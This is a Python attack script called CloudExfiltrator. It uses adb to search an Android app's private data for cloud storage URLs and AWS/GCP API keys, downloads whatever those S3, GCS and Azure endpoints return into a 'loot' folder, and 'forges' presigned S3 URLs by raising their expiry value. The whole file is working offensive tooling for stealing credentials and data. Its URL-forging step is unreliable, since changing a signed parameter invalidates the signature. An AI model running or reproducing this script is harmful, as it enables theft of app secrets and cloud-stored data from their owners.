#!/usr/bin/env python3
import argparse, hashlib, json, os, re, time, uuid, subprocess
from datetime import datetime
from pathlib import Path
try:
    import requests
    HAS = 1
except ImportError:
    print("[!] requests library is not installed. Please install it using 'pip install requests'.")
    HAS = 0
G="[92m";R="[91m";Y="[93m";C="[96m";X="[0m"

class CloudExfiltrator:
    def __init__(self,p,out="loot/cloud",dev=None):
        self.package=p;self.output=Path(out)/p;self.output.mkdir(parents=True,exist_ok=True)
        self.s=requests.Session() if HAS else None;self.eps=[];self.data={};self.bytes=0;self.dev=dev
        self.adb = "C:/Users/PT/Downloads/platform-tools/adb.exe"
        if not os.path.isfile(self.adb): self.adb = "adb"
        if self.dev: self.adb += f" -s {self.dev}"

    def scan(self):
        print(f"\n{C}[*] Scanning cloud endpoints on {self.dev if self.dev else 'default device'}...{X}")
        # Local paths for scanning if we pull data first, but here we try to scan directly or via ADB
        # For simplicity, we'll assume the files are pulled or we use adb shell to find strings
        dirs=[f"/data/data/{self.package}",f"/sdcard/Android/data/{self.package}"]
        pats=[(r"s3\.amazonaws\.com","s3"),(r"storage\.googleapis\.com","gcs"),(r"blob\.core\.windows\.net","azure"),(r"firebaseio\.com","firebase"),(r"AKIA[0-9A-Z]{16}","aws_key"),(r"AIza[0-9A-Za-z_-]{35}","gcp_key")]
        
        for d in dirs:
            # Try to use adb shell grep to find patterns if on device
            for ptn, tp in pats:
                cmd = f"{self.adb} shell \"grep -rE '{ptn}' {d} 2>/dev/null\""
                try:
                    out = subprocess.check_output(cmd, shell=True, text=True, errors='ignore')
                    for line in out.splitlines():
                        if ':' in line:
                            fp, val = line.split(':', 1)
                            self.eps.append({'type':tp,'value':val.strip(),'source':fp})
                            print(f"  {G}Found {tp}: {val.strip()[:80]}{X}")
                except: pass
        return self.eps

    def extract(self):
        if not HAS:print(f"  {Y}requests not installed{X}");return{}
        for ep in self.eps[:20]:
            if ep['type'] in ('s3','gcs','azure'):
                try:
                    url = ep['value']
                    if not url.startswith('http'): url = 'https://' + url
                    r=self.s.get(url,timeout=15)
                    if r.status_code in(200,206,301,302):
                        o=self.output/f"{ep['type']}_{hashlib.md5(url.encode()).hexdigest()[:8]}.bin"
                        open(o,'wb').write(r.content)
                        self.data[url]={'status':r.status_code,'size':len(r.content),'file':str(o)}
                        self.bytes+=len(r.content)
                        print(f"  {G}Extracted {len(r.content)}B from {ep['type']}{X}")
                except:pass
        return self.data

    def forge_signed(self):
        forged=[]
        for ep in self.eps:
            if ep['type'] in('s3','gcs')and'?'in ep['value']:
                import urllib.parse;parsed=urllib.parse.urlparse(ep['value']);params=urllib.parse.parse_qs(parsed.query)
                if'X-Amz-Expires'in params:
                    params['X-Amz-Expires']=['999999999']
                    u=urllib.parse.urlunparse((parsed.scheme,parsed.netloc,parsed.path,parsed.params,urllib.parse.urlencode(params,doseq=True),parsed.fragment))
                    forged.append({'original':ep['value'],'forged':u})
        if forged:json.dump(forged,open(self.output/'forged_urls.json','w'),indent=2)
        return forged

    def report(self):
        r={'ts':datetime.now().isoformat(),'pkg':self.package,'device':self.dev,'eps':len(self.eps),'extracted':len(self.data),'bytes':self.bytes}
        json.dump(r,open(self.output/'report.json','w'),indent=2)
        print(f"\n{G}Report: {self.output}/report.json{X}")

if __name__=='__main__':
    ap=argparse.ArgumentParser()
    ap.add_argument('--package','-p',required=True)
    ap.add_argument('--output','-o',default='loot/cloud')
    ap.add_argument('--device','-d',default=None)
    a=ap.parse_args()
    e=CloudExfiltrator(a.package,a.output,a.device)
    e.scan();e.extract();e.forge_signed();e.report()
